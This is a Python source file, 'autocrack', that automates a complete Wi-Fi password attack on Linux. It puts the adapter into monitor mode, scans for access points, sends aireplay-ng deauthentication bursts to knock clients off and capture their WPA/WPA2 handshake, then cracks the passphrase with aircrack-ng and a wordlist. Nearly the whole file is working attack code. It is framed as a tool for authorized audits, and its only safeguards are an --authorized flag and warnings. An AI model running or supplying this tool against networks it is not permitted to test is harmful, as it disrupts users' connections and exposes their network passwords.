#!/usr/bin/env python3
"""autocrack — an automated aircrack-ng workflow for *authorized* Wi-Fi audits.

This chains the aircrack-ng suite end to end with no manual steps:

    airmon-ng  -> monitor mode
    airodump-ng-> discover access points (and pick the target you own)
    airodump-ng-> targeted capture, while
    aireplay-ng-> deauth bursts force a client to re-handshake
    aircrack-ng-> crack the captured WPA/WPA2 handshake against a wordlist

It is a thin, testable orchestrator around the real aircrack-ng binaries.
It runs on **Linux** (the MediaTek MT7610U / ALFA AWUS036ACHM has monitor
mode + injection via the in-kernel `mt76x0u` driver; macOS does not support
this) and must be run as root.

> Only run this against a network you own or are explicitly authorized to
> test. Deauthentication and handshake capture against networks you do not
> control are illegal in most jurisdictions. The `--authorized` flag is a
> deliberate speed bump, not a license.
"""

from __future__ import annotations

import argparse
import os
import re
import subprocess
import sys
import time
from dataclasses import dataclass
from pathlib import Path

REQUIRED_TOOLS = ("airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng")


class AutocrackError(RuntimeError):
    """Base error for autocrack failures."""


class AuthorizationError(AutocrackError):
    """Raised when the run was not explicitly authorized."""


class ToolNotFoundError(AutocrackError):
    """Raised when a required aircrack-ng binary is not on PATH."""


class NotRootError(AutocrackError):
    """Raised when the run is not executed as root (monitor mode needs it)."""


class InterfaceNotFoundError(AutocrackError):
    """Raised when the requested Wi-Fi interface does not exist."""


class MonitorModeError(AutocrackError):
    """Raised when monitor mode could not be enabled."""


@dataclass(frozen=True)
class AccessPoint:
    bssid: str
    channel: str
    privacy: str
    power: str
    essid: str


@dataclass(frozen=True)
class AuditResult:
    bssid: str
    essid: str | None
    handshake_captured: bool
    key: str | None


# --- output parsing (pure, unit-tested) -----------------------------------


def parse_airodump_csv(text: str) -> list[AccessPoint]:
    """Parse an `airodump-ng --output-format csv` dump into access points.

    The CSV has two sections: access points, then a blank line and a
    "Station MAC" header for associated clients. Only the AP section is
    returned. Fields carry leading spaces and the file uses CRLF endings.
    """
    access_points: list[AccessPoint] = []
    for raw in text.splitlines():
        line = raw.strip()
        if not line:
            continue
        if line.startswith("BSSID,"):
            continue
        if line.startswith("Station MAC"):
            break  # stations follow; stop.
        fields = [field.strip() for field in line.split(",")]
        if len(fields) < 14 or not _looks_like_mac(fields[0]):
            continue
        access_points.append(
            AccessPoint(
                bssid=fields[0],
                channel=fields[3],
                privacy=fields[5],
                power=fields[8],
                essid=fields[13],
            )
        )
    return access_points


_MAC_RE = re.compile(r"^[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}$")


def _looks_like_mac(value: str) -> bool:
    return bool(_MAC_RE.match(value))


_MONITOR_VIF_RE = re.compile(r"enabled for \[phy\d+\]\S+ on \[phy\d+\](?P<mon>\S+?)\)")


def parse_monitor_interface(airmon_output: str, requested: str) -> str:
    """Return the monitor interface airmon-ng created, or the requested one.

    Newer airmon-ng creates a separate `<iface>mon` vif and prints a line like
    "(mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)".
    Some drivers instead switch the same interface into monitor mode in place,
    in which case we keep using the requested name.
    """
    match = _MONITOR_VIF_RE.search(airmon_output)
    if match:
        return match.group("mon")
    return requested


def scan_has_handshake(aircrack_output: str, bssid: str) -> bool:
    """True when `aircrack-ng <cap>` reports a captured handshake for bssid.

    aircrack-ng lists each network with e.g. "WPA (1 handshake)". We match the
    row for our BSSID and require a non-zero handshake count.
    """
    bssid = bssid.lower()
    for line in aircrack_output.splitlines():
        if bssid not in line.lower():
            continue
        match = re.search(r"\((\d+)\s+handshake", line)
        if match and int(match.group(1)) > 0:
            return True
    return False


_KEY_FOUND_RE = re.compile(r"KEY FOUND!\s*\[\s*(?P<key>.*?)\s*\]")


def parse_crack_key(aircrack_output: str) -> str | None:
    """Return the passphrase from an aircrack-ng "KEY FOUND! [ ... ]" line."""
    match = _KEY_FOUND_RE.search(aircrack_output)
    return match.group("key") if match else None


# --- orchestration --------------------------------------------------------


class WifiAuditor:
    """Drives the aircrack-ng suite through the full automated pipeline.

    Every external command goes through the injected `runner`/`popen`, and
    waiting through `sleep`, so the orchestration is unit-testable without a
    live radio.
    """

    def __init__(
        self,
        interface: str,
        workdir: str,
        authorized: bool,
        runner=subprocess.run,
        popen=subprocess.Popen,
        sleep=time.sleep,
        euid_getter=os.geteuid,
        check_kill: bool = True,
        net_sysfs: str = "/sys/class/net",
        clock=time.monotonic,
        refresh: float = 1.0,
    ) -> None:
        self.interface = interface
        self.workdir = Path(workdir)
        self.authorized = authorized
        self.check_kill = check_kill
        self._runner = runner
        self._popen = popen
        self._sleep = sleep
        self._euid_getter = euid_getter
        self._net_sysfs = Path(net_sysfs)
        self._clock = clock
        self._refresh = refresh
        self.monitor: str | None = None

    def ensure_root(self) -> None:
        """Monitor mode, injection, and airmon-ng all require root."""
        if self._euid_getter() != 0:
            raise NotRootError("autocrack must be run as root (e.g. with sudo).")

    def preflight(self) -> None:
        """Ensure the aircrack-ng suite is installed and the interface exists."""
        for tool in REQUIRED_TOOLS:
            completed = self._runner(["which", tool], capture_output=True, text=True)
            if completed.returncode != 0:
                raise ToolNotFoundError(
                    f"'{tool}' not found on PATH. Install the aircrack-ng suite "
                    f"(e.g. `sudo apt install aircrack-ng`)."
                )
        # Only enforce on a system that exposes sysfs (Linux); a no-op elsewhere.
        if self._net_sysfs.exists() and not (self._net_sysfs / self.interface).exists():
            raise InterfaceNotFoundError(
                f"Interface '{self.interface}' not found. Plug in the adapter and "
                f"check `iw dev` — on a Raspberry Pi the ALFA is usually wlan1 "
                f"(wlan0 is the built-in Wi-Fi)."
            )

    def enable_monitor(self) -> str:
        if self.check_kill:
            # NetworkManager/wpa_supplicant fight airodump for the radio and
            # yank it off the target channel; airmon-ng check kill stops them.
            self._runner(["airmon-ng", "check", "kill"], capture_output=True, text=True)
        completed = self._runner(
            ["airmon-ng", "start", self.interface], capture_output=True, text=True
        )
        if completed.returncode != 0:
            detail = (completed.stderr or completed.stdout or "").strip()
            raise MonitorModeError(
                f"airmon-ng could not enable monitor mode on {self.interface}: {detail}"
            )
        self.monitor = parse_monitor_interface(completed.stdout, requested=self.interface)
        if not self.monitor:
            raise MonitorModeError(f"Could not enable monitor mode on {self.interface}.")
        self._verify_monitor(self.monitor)
        return self.monitor

    def _verify_monitor(self, iface: str) -> None:
        """Confirm the interface is really in monitor mode.

        airmon-ng can exit 0 without actually switching the card (busy driver,
        rfkill, unsupported adapter), and `parse_monitor_interface` then falls
        back to the requested name -- so verify with `iw` rather than trust it.
        If `iw` isn't installed we trust airmon-ng's exit status.
        """
        try:
            info = self._runner(["iw", "dev", iface, "info"], capture_output=True, text=True)
        except FileNotFoundError:
            return
        if "type monitor" not in (info.stdout or "").lower():
            raise MonitorModeError(
                f"{iface} is not in monitor mode after airmon-ng start "
                f"(check rfkill, or that the driver supports monitor mode)."
            )

    def disable_monitor(self) -> None:
        if self.monitor:
            self._runner(["airmon-ng", "stop", self.monitor], capture_output=True, text=True)
            self.monitor = None

    def scan(self, seconds: int = 15, on_update=None) -> list[AccessPoint]:
        """Run a timed airodump-ng scan and parse the discovered access points.

        airodump-ng runs in the background writing its CSV; we re-read it every
        `refresh` seconds and, if `on_update(aps, elapsed, total)` is given,
        stream the growing list to a live display.
        """
        self._clear_captures("scan")
        prefix = self.workdir / "scan"
        csv_path = self.workdir / "scan-01.csv"
        dump = self._popen(
            [
                "airodump-ng",
                "--write", str(prefix),
                "--output-format", "csv",
                self.monitor or self.interface,
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        start = self._clock()
        aps: list[AccessPoint] = []
        try:
            while self._clock() - start < seconds:
                self._sleep(self._refresh)
                aps = self._read_scan(csv_path)
                if on_update is not None:
                    on_update(aps, min(int(self._clock() - start), seconds), seconds)
        finally:
            dump.terminate()
            try:
                dump.wait(timeout=5)
            except Exception:
                pass
        aps = self._read_scan(csv_path)
        if on_update is not None:
            on_update(aps, seconds, seconds)
        return aps

    def _read_scan(self, csv_path: Path) -> list[AccessPoint]:
        if not csv_path.exists():
            return []
        return parse_airodump_csv(csv_path.read_text(errors="replace"))

    def capture_handshake(
        self,
        bssid: str,
        channel: str,
        deauth_rounds: int = 4,
        poll_seconds: int = 5,
        essid: str | None = None,
        on_update=None,
    ) -> tuple[Path, bool]:
        """Capture a WPA handshake for bssid, nudging clients with deauths.

        Runs a targeted airodump-ng in the background, then alternates deauth
        bursts with handshake-presence checks until one is captured or the
        deauth rounds are exhausted. Returns the capture path and whether a
        handshake was seen. If `on_update(elapsed, done, total, captured)` is
        given, progress is streamed to a live display after each round.
        """
        self._clear_captures("handshake")
        prefix = self.workdir / "handshake"
        cap_path = self.workdir / "handshake-01.cap"
        captured = False
        start = self._clock()
        dump = self._popen(
            [
                "airodump-ng",
                "--bssid", bssid,
                "--channel", channel,
                "--write", str(prefix),
                "--output-format", "pcap",
                self.monitor or self.interface,
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        try:
            for round_index in range(deauth_rounds):
                self._runner(
                    ["aireplay-ng", "--deauth", "5", "-a", bssid, self.monitor or self.interface],
                    capture_output=True,
                    text=True,
                )
                self._sleep(poll_seconds)
                captured = self._handshake_present(cap_path, bssid)
                if on_update is not None:
                    on_update(
                        bssid, essid, int(self._clock() - start),
                        round_index + 1, deauth_rounds, captured,
                    )
                if captured:
                    break
        finally:
            dump.terminate()
            try:
                dump.wait(timeout=5)
            except Exception:
                pass
        return cap_path, captured

    def _clear_captures(self, prefix: str) -> None:
        """Remove leftover files from a previous run so we never read stale
        scan results or a stale handshake as if they were this run's."""
        for stale in self.workdir.glob(f"{prefix}-*"):
            try:
                stale.unlink()
            except OSError:
                pass

    def _handshake_present(self, cap_path: Path, bssid: str) -> bool:
        completed = self._runner(
            ["aircrack-ng", str(cap_path)], capture_output=True, text=True
        )
        return scan_has_handshake(completed.stdout, bssid)

    def crack(self, cap_path: Path, bssid: str, wordlist: str) -> str | None:
        completed = self._runner(
            ["aircrack-ng", "-w", wordlist, "-b", bssid, str(cap_path)],
            capture_output=True,
            text=True,
        )
        return parse_crack_key(completed.stdout)

    def _resolve_target(
        self,
        bssid: str | None,
        channel: str | None,
        essid: str | None,
        scan_seconds: int,
        on_scan_update=None,
        verbose: bool = True,
    ) -> tuple[str, str, str | None]:
        """Return the (bssid, channel, essid) to attack, scanning if needed.

        Monitor mode must already be enabled (airodump can't scan a managed
        interface). Refuses to pick a target on its own when several APs are in
        range and none was named -- you choose what you're allowed to test.
        """
        if bssid:
            if not channel:
                raise AutocrackError("A channel is required when a BSSID is given.")
            return bssid, channel, essid

        if verbose:
            print(f"[*] Scanning {scan_seconds}s on {self.monitor or self.interface} ...", file=sys.stderr)
        access_points = self.scan(seconds=scan_seconds, on_update=on_scan_update)
        if not access_points:
            raise AutocrackError("No access points found. Move closer or scan longer.")
        if essid:
            for ap in access_points:
                if ap.essid == essid:
                    return ap.bssid, ap.channel, ap.essid
            raise AutocrackError(f"ESSID {essid!r} was not seen in the scan.")

        listing = "\n".join(
            f"    {ap.bssid}  ch {ap.channel:>3}  {ap.power:>4} dBm  {ap.privacy:<10} {ap.essid}"
            for ap in access_points
        )
        raise AutocrackError(
            "Several APs are in range; target one with a BSSID+channel or an "
            "ESSID you own:\n" + listing
        )

    def run(
        self,
        *,
        wordlist: str,
        bssid: str | None = None,
        channel: str | None = None,
        essid: str | None = None,
        deauth_rounds: int = 4,
        scan_seconds: int = 15,
        on_scan_update=None,
        on_capture_update=None,
        verbose: bool = True,
    ) -> AuditResult:
        """Run the full automated pipeline against a single target you own.

        `verbose` prints one-line stage milestones to stderr; turn it off when a
        live display already shows progress, to avoid fighting its redraw.
        """
        if not self.authorized:
            raise AuthorizationError(
                "Refusing to run without explicit authorization. Pass --authorized "
                "only for a network you own or are permitted to test."
            )
        self.ensure_root()
        self.preflight()
        self.enable_monitor()
        try:
            bssid, channel, essid = self._resolve_target(
                bssid, channel, essid, scan_seconds,
                on_scan_update=on_scan_update, verbose=verbose,
            )
            if verbose:
                print(f"[*] Target {bssid} (ch {channel}) — capturing handshake ...", file=sys.stderr)
            cap_path, captured = self.capture_handshake(
                bssid, channel, deauth_rounds=deauth_rounds, essid=essid,
                on_update=on_capture_update,
            )
            key = self.crack(cap_path, bssid, wordlist) if captured else None
        finally:
            self.disable_monitor()
        return AuditResult(bssid=bssid, essid=essid, handshake_captured=captured, key=key)


# --- live display ---------------------------------------------------------


def render_scan_table(access_points, elapsed, total) -> str:
    """Render a refreshing airodump-style AP table for the live display."""
    header = f"  Scanning… {elapsed}s / {total}s      {len(access_points)} AP(s) found"
    cols = f"  {'BSSID':<17}  {'CH':>3}  {'PWR':>4}  {'PRIVACY':<12} ESSID"
    if not access_points:
        return "\n".join([header, cols, "  (listening…)"])
    rows = [
        f"  {ap.bssid:<17}  {ap.channel:>3}  {ap.power:>4}  {ap.privacy:<12} {ap.essid}"
        for ap in access_points
    ]
    return "\n".join([header, cols, *rows])


def render_capture_status(bssid, essid, elapsed, done, total, captured) -> str:
    """Render the live handshake-capture status block."""
    target = f"{bssid} ({essid})" if essid else bssid
    state = "handshake captured ✓" if captured else "handshake: waiting…"
    return (
        f"  Capturing handshake — {target}\n"
        f"  elapsed {elapsed}s   deauth {done}/{total}   {state}"
    )


class LiveWriter:
    """Repaints a multi-line frame in place using ANSI cursor control.

    Disabled (no tty, or --quiet) it writes nothing, so piped/non-interactive
    runs stay clean and the plain stderr milestones carry the story instead.
    """

    def __init__(self, stream=None, enabled: bool = True) -> None:
        self._stream = stream if stream is not None else sys.stdout
        self._enabled = enabled
        self._lines = 0

    def update(self, text: str) -> None:
        if not self._enabled:
            return
        if self._lines:
            # Move up to the start of the previous frame and clear to end.
            self._stream.write(f"\033[{self._lines}F\033[J")
        self._stream.write(text + "\n")
        self._stream.flush()
        self._lines = text.count("\n") + 1

    def finish(self) -> None:
        """Leave the last frame in place; subsequent output starts below it."""
        self._lines = 0


# --- CLI ------------------------------------------------------------------


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="autocrack",
        description=(
            "Automated aircrack-ng workflow (monitor -> scan -> capture -> "
            "crack) for AUTHORIZED Wi-Fi audits on Linux."
        ),
    )
    parser.add_argument("--interface", required=True, help="Wi-Fi interface, e.g. wlan0")
    parser.add_argument("--wordlist", required=True, help="Path to a passphrase wordlist")
    parser.add_argument("--bssid", help="Target AP BSSID (skip interactive scan/select)")
    parser.add_argument("--channel", help="Target AP channel (required with --bssid)")
    parser.add_argument("--essid", help="Target AP ESSID (used to auto-resolve BSSID/channel)")
    parser.add_argument("--scan-time", type=int, default=15, help="Seconds to scan for APs")
    parser.add_argument("--deauth-rounds", type=int, default=4, help="Deauth/capture attempts")
    parser.add_argument(
        "--workdir", default="/tmp/autocrack", help="Directory for capture files"
    )
    parser.add_argument(
        "--no-check-kill",
        action="store_true",
        help="Do not run `airmon-ng check kill` (leave NetworkManager running)",
    )
    parser.add_argument(
        "--quiet",
        action="store_true",
        help="Disable the live table/status display (print plain milestones only)",
    )
    parser.add_argument(
        "--authorized",
        action="store_true",
        help="Confirm you own or are permitted to test the target (required)",
    )
    return parser


def main(argv: list[str] | None = None) -> int:
    args = build_parser().parse_args(argv)

    if not args.authorized:
        print(
            "[!] Refusing to run without --authorized. Only test networks you own "
            "or are explicitly permitted to test.",
            file=sys.stderr,
        )
        return 2

    auditor = WifiAuditor(
        interface=args.interface,
        workdir=args.workdir,
        authorized=args.authorized,
        check_kill=not args.no_check_kill,
    )

    live = (not args.quiet) and sys.stdout.isatty()
    display = LiveWriter(enabled=live)
    on_scan = lambda aps, elapsed, total: display.update(render_scan_table(aps, elapsed, total))
    on_capture = lambda b, e, elapsed, done, total, got: display.update(
        render_capture_status(b, e, elapsed, done, total, got)
    )

    try:
        auditor.workdir.mkdir(parents=True, exist_ok=True)
        result = auditor.run(
            wordlist=args.wordlist,
            bssid=args.bssid,
            channel=args.channel,
            essid=args.essid,
            deauth_rounds=args.deauth_rounds,
            scan_seconds=args.scan_time,
            on_scan_update=on_scan,
            on_capture_update=on_capture,
            verbose=not live,
        )
    except AutocrackError as exc:
        display.finish()
        print(f"[!] {exc}", file=sys.stderr)
        return 1
    finally:
        display.finish()

    if not result.handshake_captured:
        print("[-] No handshake captured. Try more deauth rounds or a busier time.")
        return 1
    if result.key is None:
        print("[-] Handshake captured but passphrase not in wordlist.")
        return 1
    print(f"[+] KEY FOUND for {result.bssid}: {result.key}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
